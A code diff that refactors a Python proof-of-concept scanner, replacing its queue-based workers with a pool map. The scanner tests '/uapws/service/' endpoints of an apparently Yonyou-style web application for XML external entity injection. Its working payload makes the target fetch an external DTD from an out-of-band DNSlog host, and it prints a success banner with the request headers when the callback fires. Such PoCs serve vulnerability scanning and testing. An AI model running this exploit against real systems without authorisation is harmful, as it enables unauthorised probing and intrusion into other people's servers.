@@ -13,7 +13,6 @@ GitHub:
 # -*- coding: utf-8 -*-
 from gevent import monkey;monkey.patch_all()
 from gevent.pool import Pool
-from gevent.queue import Queue
 import requests
 import os
 import sys
@@ -33,14 +32,8 @@ class poc:
         self.headers = {
             'Connection': 'close'
         }
-        self.q = Queue()
         self.text_list = []
         self.proxies = proxies
-
-    def vuln_path(self):
-        for xxe_path in self.xxe_apis:
-            self.q.put(xxe_path)
-        return True
 
     def host(self):
         url = urlparse(self.url)
@@ -48,43 +41,34 @@ class poc:
         scheme = url.scheme
         return netloc, scheme
 
-    def vuln(self, url):
-        while True:
-            result_text = ""
-            if self.q.qsize() == 0:
-                break
-            try:
-                api = self.q.get_nowait()
-                dnslog_all = dnslogs(self.proxies).get_dnslog()
-                dnslog = dnslog_all[0]
-                target_url = url + "/uapws/service/" + api + "?xsd=http://" + dnslog + "/ext.dtd"
-                self.headers['User-Agent'] = get_user_agent.get_user_agent()
-                result = requests.get(url=target_url, headers=self.headers, verify=False, proxies=self.proxies)
-                for i in range(5):
-                    dnslog_result = dnslogs(self.proxies).get_result(dnslog_all[1])
-                if dnslog_result != "[]":
-                    target = urlparse(target_url)
-                    result_text += """\n        [+]    \033[32m检测到目标站点存在XML外部实体注入漏洞\033[0m
-                 GET {} HTTP/1.1
-                 Host: {}""".format(target.path + "?" + target.query, target.netloc)
-                    for request_type, request_text in dict(result.request.headers).items():
-                        result_text += "\n                 {}: {}".format(request_type, request_text)
-                    self.text_list.append(result_text)
-            except Exception as e:
-                pass
-
-    def main(self):
+    def vuln(self, api):
         all = self.host()
         netloc = all[0]
         scheme = all[1]
-        pool = Pool(5)
         url = "{}://{}".format(scheme, netloc)
-        if self.vuln_path():
-            try:
-                tasks = [pool.spawn(self.vuln, url) for i in range(10)]
-                pool.join()
-            except:
-                pass
+        result_text = ""
+        try:
+            dnslog_all = dnslogs(self.proxies).get_dnslog()
+            dnslog = dnslog_all[0]
+            target_url = url + "/uapws/service/" + api + "?xsd=http://" + dnslog + "/ext.dtd"
+            self.headers['User-Agent'] = get_user_agent.get_user_agent()
+            result = requests.get(url=target_url, headers=self.headers, verify=False, proxies=self.proxies)
+            for i in range(5):
+                dnslog_result = dnslogs(self.proxies).get_result(dnslog_all[1])
+            if dnslog_result != "[]":
+                target = urlparse(target_url)
+                result_text += """\n        [+]    \033[32m检测到目标站点存在XML外部实体注入漏洞\033[0m
+             GET {} HTTP/1.1
+             Host: {}""".format(target.path + "?" + target.query, target.netloc)
+                for request_type, request_text in dict(result.request.headers).items():
+                    result_text += "\n                 {}: {}".format(request_type, request_text)
+                self.text_list.append(result_text)
+        except Exception as e:
+            pass
+
+    def main(self):
+        pool = Pool(len(self.xxe_apis))
+        pool.map(self.vuln, self.xxe_apis)
         return self.text_list
 
 
